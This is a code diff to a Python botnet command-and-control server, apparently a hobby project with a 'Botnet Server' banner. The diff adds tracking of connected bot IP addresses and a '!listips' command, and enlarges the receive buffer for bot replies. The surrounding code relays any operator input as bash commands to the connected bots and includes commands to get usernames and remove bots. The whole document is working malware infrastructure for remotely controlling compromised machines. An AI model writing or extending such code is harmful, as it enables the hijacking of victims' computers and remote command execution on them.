@@ -7,6 +7,7 @@ hostname = socket.gethostname()
 connections = []
 start_recv = False
 bot_count = 0
+conn_ips = []
 print(" ____        _              _      _____                            ___    ___  ")
 print("|  _ \      | |            | |    / ____|                          |__ \  / _ \ ")
 print("| |_) | ___ | |_ _ __   ___| |_  | (___   ___ _ ____   _____ _ __     ) || | | |")
@@ -28,14 +29,18 @@ def listen():
         start_recv = True
         connections.append(conn)
         print(f"\n[+] {ip} has joined the Botnet Server.")
+        conn_ips.append(ip[0])
 def recv():
     while True:
         for connection in connections:
             try:
                 conn = connection
-                clientmsg = conn.recv(1024)
-                clientmsgdecode = clientmsg.decode()
-                print(f"\n[+] Message from Connection {conn}: {clientmsgdecode}\n")
+                message = conn.recv(10240)
+                message = message.decode()
+                if message.strip() == "":
+                    pass
+                else:
+                    print(f"\n[+] Message from Conn {conn}: {message}")
             except:
                 pass
 def instruct():
@@ -105,6 +110,8 @@ def instruct():
                 print("\n[+] Eradicating Bots.....")
             elif instruction.decode().lower().startswith('!getusername'):
                 print("\n[+] Getting the usernames of the bots....")
+            elif instruction.decode().lower().startswith('!listips'):
+                print(f"[+] List of IPs: {conn_ips}")
             else:
                 print("")
                 print(f"[+] Sending '{instruction.decode()}' as a bash command to the bots.....")
